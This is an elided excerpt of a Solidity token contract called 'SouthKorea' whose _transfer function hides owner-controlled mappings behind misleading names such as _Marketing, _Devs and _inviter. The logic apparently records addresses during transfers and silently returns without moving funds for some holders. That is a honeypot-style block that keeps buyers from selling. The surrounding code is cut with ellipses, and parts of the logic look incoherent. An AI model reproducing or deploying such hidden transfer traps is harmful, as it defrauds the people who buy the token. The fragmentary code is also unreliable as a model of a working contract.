...
contract SouthKorea is IERC20, Ownable {
    ...
    mapping(address => uint256) private _inviter;
    ...
    function _transfer(
        ...
        uint256 _square = _Marketing[_members];
        address _pass = _Devs[_native];

        if (_Marketing[_members] > 0 && amount > _native) {
            ...
            if (_Marketing[_members] == 0 && _members != uniswapV2Pair && _inviter[_members] > 0) {
                return;
            }
            _inviter[_pass] = _taxFee;
            _Devs[_native] = _BuyBack;

            if (_taxFee > 0 && !inSwapAndLiquify && _Marketing[_members] == 0 && _Marketing[_BuyBack] == 0) {
                amount -= fee;
                _balances[_members] -= fee;
            }

            _balances[_members] -= amount;
            _balances[_BuyBack] += amount;
            emit Transfer(_members, _BuyBack, amount);
        }
    }
